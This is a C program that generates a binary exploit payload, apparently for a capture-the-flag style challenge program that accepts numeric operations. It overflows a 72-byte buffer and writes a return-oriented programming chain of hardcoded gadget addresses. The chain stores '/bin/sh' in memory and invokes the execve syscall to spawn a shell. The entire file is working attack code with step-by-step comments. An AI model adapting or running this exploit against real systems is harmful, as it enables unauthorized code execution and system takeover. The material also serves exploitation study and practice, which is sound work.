#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#define FILE_PATH "./input.bin"
#define PROGRAM_NAME = "/bin/sh\0"
#define EXECVE_SYSCALL_NUMBER 59
#define NUMBER_OPERATIONS "100\n"

#define MOV_GADGET     0x44526e
#define STRING_ADDRESS 0x6c1000
#define POP_RAX_GADGET 0x44db34
#define POP_RDI_GADGET 0x401b73
#define POP_RSI_GADGET 0x401c87
#define POP_RDX_GADGET 0x437a85
#define SYSCALL_GADGET 0x400488

void writeQword(FILE *fp, uint64_t qword);
void writeDword(FILE *fp, int32_t dword);

int main(void)
{
    // Open the file
    FILE *fp = fopen(FILE_PATH, "wb");
    if(!fp)
    {
        fprintf(stderr, "[ERROR] Cannot write to: %s\n", FILE_PATH);
        exit(EXIT_FAILURE);
    }

    // Write 100 as the number of operations we want to do
    (void) fputs(NUMBER_OPERATIONS, fp);

    // Write 8 * 9 = 72 bytes of 0s to fill the buffer and to not cause problems to free()
    for(int i = 1; i <= 9; i++)
    {
        writeQword(fp, (uint64_t) 0);
    }

    // ROP Gadgets
    /*
        Writing the string "/bin/sh"
        pop rax      <-- Address of string
        pop rdx      <-- String literal "/bin/sh\0"
        mov qword ptr [rax], rdx ; ret
    */
    writeQword(fp, POP_RAX_GADGET);
    writeQword(fp, STRING_ADDRESS); 
    writeQword(fp, POP_RDX_GADGET);
    writeQword(fp, (uint64_t) 0x0068732F6E69622F);
    writeQword(fp, MOV_GADGET);

    /*
        Making the syscall to execve
        pop rax     <-- 59 syscall number
        pop rdi     <-- string address
        pop rsi     <-- 0
        pop rdx     <-- 0
    */
    writeQword(fp, POP_RAX_GADGET);
    writeQword(fp, EXECVE_SYSCALL_NUMBER);
    writeQword(fp, POP_RDI_GADGET);
    writeQword(fp, STRING_ADDRESS);
    writeQword(fp, POP_RSI_GADGET);
    writeQword(fp, 0);
    writeQword(fp, POP_RDX_GADGET);
    writeQword(fp, 0);
    writeQword(fp, SYSCALL_GADGET);

    fputs("5\n", fp);

    fclose(fp);
    return EXIT_SUCCESS;
}

void writeQword(FILE *fp, uint64_t qword)
{
    writeDword(fp, (int32_t)(qword & 0xffffffff));
    writeDword(fp, (int32_t)((qword >> 32) & 0xffffffff));
}

void writeDword(FILE *fp, int32_t dword)
{
    (void) fputs("1\n", fp);
    (void) fputs("100\n", fp);
    
    char buf[20];
    sprintf(buf, "%d\n", dword - 100);
    (void) fputs(buf, fp);
}